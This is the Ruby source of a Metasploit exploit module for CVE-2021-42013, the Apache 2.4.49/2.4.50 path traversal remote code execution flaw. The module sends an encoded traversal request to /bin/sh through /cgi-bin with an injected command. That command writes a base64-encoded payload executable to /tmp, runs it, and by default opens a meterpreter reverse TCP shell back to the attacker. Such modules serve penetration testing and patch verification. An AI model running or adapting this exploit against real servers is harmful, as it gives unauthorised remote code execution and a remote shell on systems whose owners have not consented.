class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::EXE
    include Msf::Exploit::FileDropper
    include Msf::Exploit::Remote::CheckModule
    include Msf::Exploit::Remote::HttpClient
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE',
          'Description' => %q{
            Unauthenticated RCE vulnerability for apache.
          },
          'References' => [
            ['CVE', '2021-42013']
          ],
          'Author' => [
            'Ash Daulton', # Vulnerability discovery
            'Dhiraj Mishra', # Metasploit auxiliary module
            'Luukas Lusetti' # Metasploit exploit module
          ],
          'DisclosureDate' => '2021-05-10',
          'License' => MSF_LICENSE,
          'Platform' => ['unix', 'linux'],
          'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
          'DefaultOptions' => {
            'CheckModule' => 'auxiliary/scanner/http/apache_normalize_path',
            'Action' => 'CHECK_RCE',
            'RPORT' => 8080,
            'SSL' => false
          },
          'Targets' => [
            [
              'Automatic (Dropper)',
              {
                'Platform' => 'linux',
                'Arch' => [ARCH_X64, ARCH_X86],
                'Type' => :linux_dropper,
                'DefaultOptions' => {
                  'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
                  'DisablePayloadHandler' => 'false'
                }
              }
            ]
          ],
          'DefaultTarget' => 0,
          'Notes' => {
            'Stability' => [CRASH_SAFE],
            'Reliability' => [REPEATABLE_SESSION],
            'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
          }
        )
      )
    end

    def exec_cmd(command)
        traversal = '.%%32%65/'*5 << '/bin/sh'
        uri = normalize_uri('/cgi-bin', traversal.to_s)
        response = send_request_raw({
            'method' => Rex::Text.rand_text_alpha(3..4),
            'uri' => uri,
            'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{command}"
        })
        if response && response.body
            return response.body
        end
    
        false
    end

    def exploit

        if (!check.eql? Exploit::CheckCode::Vulnerable)
        fail_with(Failure::NotVulnerable, 'The target is not vulnerable to CVE-2021.')
        end

        print_status("Attempt to exploit for CVE-2021-42013")
        file_name = "/tmp/#{Rex::Text.rand_text_alpha(4..8)}"
        cmd = "echo #{Rex::Text.encode_base64(generate_payload_exe)} | base64 -d > #{file_name}; chmod +x #{file_name}; #{file_name}; rm -f #{file_name}"
        print_status("Sending #{datastore['PAYLOAD']} command payload")
        print_status("Generated command payload: #{cmd}")

        exec_cmd(cmd)

        register_file_for_cleanup file_name
    end
end